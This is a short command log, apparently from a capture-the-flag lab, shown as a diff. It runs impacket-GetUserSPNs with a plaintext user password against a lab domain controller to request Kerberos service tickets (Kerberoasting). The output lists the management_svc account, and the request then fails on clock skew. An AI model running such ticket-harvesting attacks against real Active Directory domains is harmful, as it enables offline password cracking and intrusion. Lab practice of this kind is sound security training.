@@ -1,0 +1,17 @@
+### [2026-04-05 17:40:08] impacket-GetUserSPNs -dc-ip 10.129.231.186 -request certified.htb/judith.mader:judith09
+
+$ impacket-GetUserSPNs -dc-ip 10.129.231.186 -request certified.htb/judith.mader:judith09
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
+---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
+certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 23:30:51.476756  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+# Exit code: 0
+# Duration: 2026-04-05 17:40:09
